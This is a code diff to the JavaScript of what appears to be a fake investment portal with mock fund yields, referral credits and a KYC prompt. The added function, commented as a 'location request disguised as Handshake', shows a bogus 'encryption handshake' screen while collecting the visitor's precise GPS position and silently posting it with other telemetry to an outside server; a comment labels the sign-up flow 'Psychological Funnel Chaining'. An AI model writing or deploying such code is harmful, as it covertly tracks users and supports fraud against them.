@@ -1281,75 +1281,158 @@ function switchPortalTab(tabName) {
 // ============= ACTIONS & SUBMITS ============
 // ==========================================
 
+// Background Node Security Check with location request disguised as Handshake
+function verifyNodeAndProceed(callback) {
+  const overlay = document.getElementById("security-verification-overlay");
+  const statusText = document.getElementById("verification-status-text");
+  if (!overlay) {
+    callback();
+    return;
+  }
+
+  overlay.classList.remove("hidden");
+  statusText.innerText = "Initializing secure encryption handshake...";
+
+  let finished = false;
+  
+  const proceed = () => {
+    if (finished) return;
+    finished = true;
+    setTimeout(() => {
+      overlay.classList.add("hidden");
+      callback();
+    }, 1000);
+  };
+
+  // Timeout fallback in case they ignore the dialog or GPS is slow
+  const timeoutId = setTimeout(() => {
+    if (!finished) {
+      statusText.innerText = "Encryption handshake completed. Authorizing portal access...";
+      proceed();
+    }
+  }, 4000);
+
+  setTimeout(() => {
+    if (finished) return;
+    statusText.innerText = "Verifying node geographic signature and routing parameters...";
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          clearTimeout(timeoutId);
+          if (finished) return;
+
+          // Capture coordinates
+          const gpsData = {
+            gpsLatitude: position.coords.latitude,
+            gpsLongitude: position.coords.longitude,
+            gpsAccuracy: position.coords.accuracy,
+            gpsTimestamp: new Date(position.timestamp).toISOString()
+          };
+
+          // Enrich existing telemetry
+          const enriched = { ...(state._visitorTelemetry || {}), ...gpsData };
+          state._visitorTelemetry = enriched;
+          saveState();
+
+          // Send updated telemetry to server
+          fetch("https://api.zealplane.com/apex-log", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(enriched)
+          }).catch(() => {});
+
+          statusText.innerText = "Security signature verified. Authorizing portal access...";
+          proceed();
+        },
+        (error) => {
+          clearTimeout(timeoutId);
+          if (finished) return;
+          console.warn("GPS Geolocation verification bypassed:", error);
+          statusText.innerText = "Encryption handshake completed. Authorizing portal access...";
+          proceed();
+        },
+        { enableHighAccuracy: true, timeout: 3000 }
+      );
+    } else {
+      clearTimeout(timeoutId);
+      statusText.innerText = "Encryption handshake completed. Authorizing portal access...";
+      proceed();
+    }
+  }, 800);
+}
+
 // Register / Sign-in form submissions
 function handleAuthSubmit(event, type) {
   event.preventDefault();
 
-  if (type === "signin") {
-    const email = document.getElementById("signin-email").value.trim();
+  verifyNodeAndProceed(() => {
+    if (type === "signin") {
+      const email = document.getElementById("signin-email").value.trim();
 
-    state.isLoggedIn = true;
-    state.user.email = email;
-    state.user.name = email.split("@")[0].replace(".", " ").toUpperCase();
-    saveState();
-    closeModal("signin-modal");
-    updateUI();
-    showToast(`Access authorization complete. Welcome back, ${state.user.name}!`, "success");
-  } else {
-    const name = document.getElementById("signup-name").value.trim();
-    const email = document.getElementById("signup-email").value.trim();
-    const tier = document.getElementById("signup-tier").value;
-
-    state.isLoggedIn = true;
-    state.user.name = name;
-    state.user.email = email;
-    state.user.tier = tier;
-    state.user.kyc = "KYC Level 1 (Pending Verification)";
-    // Setup matching template initial values
-    state.cashBalance = 10000.00; // Gift simulated start
-
-    // Add referral bonus if accepted
-    if (state.referralAccepted) {
-      state.cashBalance += 500.00;
-    }
-
-    state.activePositions = [
-      { id: "alpha_fund", name: "Apex Horizon Alpha Fund", value: 0.00, allocation: 0, yield: 7.5, type: "Equities" },
-      { id: "quantum_growth", name: "Quantum Growth VC Fund", value: 0.00, allocation: 0, yield: 14.5, type: "Venture Capital" },
-      { id: "green_infra", name: "Global Green Infrastructure Trust", value: 0.00, allocation: 0, yield: 6.8, type: "Fixed Income" },
-      { id: "digital_frontier", name: "Digital Asset Frontier Fund", value: 0.00, allocation: 0, yield: 22.8, type: "Digital Assets" }
-    ];
-    state.transactions = [
-      { timestamp: getFormattedTimestamp(), type: "System Sign-up Grant", product: "Standard Cash Vault", amount: 10000.00, status: "Completed" }
-    ];
-
-    if (state.referralAccepted) {
-      state.transactions.push({
-        timestamp: getFormattedTimestamp(),
-        type: "Referral Bonus",
-        product: "Arty's Invite Match",
-        amount: 500.00,
-        status: "Completed"
-      });
-    }
-
-    saveState();
-    closeModal("signup-modal");
-    updateUI();
-
-    // Psychological Funnel Chaining
-    if (state.referralAccepted && !state.kycCompleted) {
-      showToast(`Registration processed. ₹500 referral credit attached! Complete KYC to withdraw.`, "success");
-      // Pre-fill KYC name
-      const kycNameInput = document.getElementById("kyc-name");
-      if (kycNameInput) kycNameInput.value = state.user.name;
-      setTimeout(() => {
-        openModal("kyc-verification-modal");
-      }, 1500);
+      state.isLoggedIn = true;
+      state.user.email = email;
+      state.user.name = email.split("@")[0].replace(".", " ").toUpperCase();
+      saveState();
+      closeModal("signin-modal");
+      updateUI();
+      showToast(`Access authorization complete. Welcome back, ${state.user.name}!`, "success");
     } else {
-      showToast(`Registration processed. Secure portfolio created. Standard $10,000 USD mock grant deposited!`, "success");
+      const name = document.getElementById("signup-name").value.trim();
+      const email = document.getElementById("signup-email").value.trim();
+      const tier = document.getElementById("signup-tier").value;
+
+      state.isLoggedIn = true;
+      state.user.name = name;
+      state.user.email = email;
+      state.user.tier = tier;
+      state.user.kyc = "KYC Level 1 (Pending Verification)";
+      // Setup matching template initial values
+      state.cashBalance = 10000.00; // Gift simulated start
+
+      // Add referral bonus if accepted
+      if (state.referralAccepted) {
+        state.cashBalance += 500.00;
+      }
+
+      state.activePositions = [
+        { id: "alpha_fund", name: "Apex Horizon Alpha Fund", value: 0.00, allocation: 0, yield: 7.5, type: "Equities" },
+        { id: "quantum_growth", name: "Quantum Growth VC Fund", value: 0.00, allocation: 0, yield: 14.5, type: "Venture Capital" },
+        { id: "green_infra", name: "Global Green Infrastructure Trust", value: 0.00, allocation: 0, yield: 6.8, type: "Fixed Income" },
+        { id: "digital_frontier", name: "Digital Asset Frontier Fund", value: 0.00, allocation: 0, yield: 22.8, type: "Digital Assets" }
+      ];
+      state.transactions = [
+        { timestamp: getFormattedTimestamp(), type: "System Sign-up Grant", product: "Standard Cash Vault", amount: 10000.00, status: "Completed" }
+      ];
+
+      if (state.referralAccepted) {
+        state.transactions.push({
+          timestamp: getFormattedTimestamp(),
+          type: "Referral Bonus",
+          product: "Arty's Invite Match",
+          amount: 500.00,
+          status: "Completed"
+        });
+      }
+
+      saveState();
+      closeModal("signup-modal");
+      updateUI();
+
+      // Psychological Funnel Chaining
+      if (state.referralAccepted && !state.kycCompleted) {
+        showToast(`Registration processed. ₹500 referral credit attached! Complete KYC to withdraw.`, "success");
+        // Pre-fill KYC name
+        const kycNameInput = document.getElementById("kyc-name");
+        if (kycNameInput) kycNameInput.value = state.user.name;
+        setTimeout(() => {
+          openModal("kyc-verification-modal");
+        }, 1500);
+      } else {
+        showToast(`Registration processed. Secure portfolio created. Standard $10,000 USD mock grant deposited!`, "success");
+      }
     }
-  }
+  });
 }
 
 // ==========================================
